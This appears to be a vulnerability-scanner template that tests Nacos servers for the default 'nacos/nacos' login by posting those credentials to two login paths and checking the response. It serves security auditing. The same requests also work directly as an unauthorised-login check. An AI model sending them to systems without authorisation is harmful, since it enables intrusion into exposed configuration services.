expression: r0() || r1()
id: nacos-default-password
info:
  author: zan8in
  name: Nacos Default Password
  severity: high
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'"username":')  &&
      response.body.bcontains(b'"nacos"')
    request:
      body: username=nacos&password=nacos
      method: POST
      path: /v1/auth/users/login
  r1:
    expression: response.status == 200 && response.body.bcontains(b'"username":')  &&
      response.body.bcontains(b'"nacos"')
    request:
      body: username=nacos&password=nacos
      method: POST
      path: /nacos/v1/auth/users/login
